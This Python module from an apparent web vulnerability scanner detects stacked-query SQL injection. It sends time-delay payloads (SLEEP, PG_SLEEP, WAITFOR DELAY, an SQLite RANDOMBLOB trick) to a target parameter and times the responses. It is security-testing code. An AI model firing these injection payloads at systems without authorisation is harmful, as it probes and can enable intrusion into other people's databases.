"""Stacked-query SQL injection detector.

A stacked injection lets the attacker terminate the original statement and
run a second one (``…; SELECT SLEEP(5)--``). Output of that second statement
is rarely reflected, so we confirm the same way as time-based detection: ask
the second statement to sleep and measure the delay.

Stacked queries are often more severe than in-band injection — they can run
DML/DDL, not just read data — so a confirmed hit is reported as critical.
"""

from __future__ import annotations

from ..http_client import HttpClient
from ..target import Target
from .base import Detector, Finding, Severity

_DELAY = 5

# (label, template) — {d} is seconds; {big} is the SQLite blob-size trick.
_PAYLOADS = [
    ("mysql", "'; SELECT SLEEP({d})-- -"),
    ("mysql-numeric", "; SELECT SLEEP({d})-- -"),
    ("mysql-hash", "'; SELECT SLEEP({d})#"),
    ("postgres", "'; SELECT PG_SLEEP({d})-- -"),
    ("postgres-numeric", "; SELECT PG_SLEEP({d})-- -"),
    ("mssql", "; WAITFOR DELAY '0:0:{d}'-- -"),
    ("mssql-quote", "'; WAITFOR DELAY '0:0:{d}'-- -"),
    ("sqlite", "; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({big}))))-- -"),
]


class StackedQueryDetector(Detector):
    name = "stacked-queries"

    async def test_parameter(
        self, client: HttpClient, target: Target, param: str
    ) -> list[Finding]:
        base_value = target.params.get(param, "")

        b1 = await self._elapsed(client, target, param, base_value)
        b2 = await self._elapsed(client, target, param, base_value)
        baseline = min(b1, b2)

        for label, template in _PAYLOADS:
            payload = base_value + template.format(d=_DELAY, big=_DELAY * 2_000_000)
            delayed = await self._elapsed(client, target, param, payload)
            if delayed - baseline < _DELAY * 0.7:
                continue
            confirm = await self._elapsed(client, target, param, payload)
            if confirm - baseline < _DELAY * 0.7:
                continue
            confidence = min(1.0, (delayed - baseline) / _DELAY)
            return [
                Finding(
                    technique=self.name,
                    parameter=param,
                    severity=Severity.CRITICAL,
                    payload=payload,
                    evidence=(
                        f"{label}: stacked statement delayed the response "
                        f"(baseline {baseline:.2f}s vs {delayed:.2f}s / "
                        f"{confirm:.2f}s for a requested {_DELAY}s sleep), "
                        "confirming a second SQL statement executed."
                    ),
                    confidence=confidence,
                    detail={"context": label, "base_value": base_value, "delay": _DELAY},
                )
            ]
        return []

    async def _elapsed(
        self, client: HttpClient, target: Target, param: str, value: str
    ) -> float:
        resp = await self._request(client, target, param, value)
        return resp.elapsed
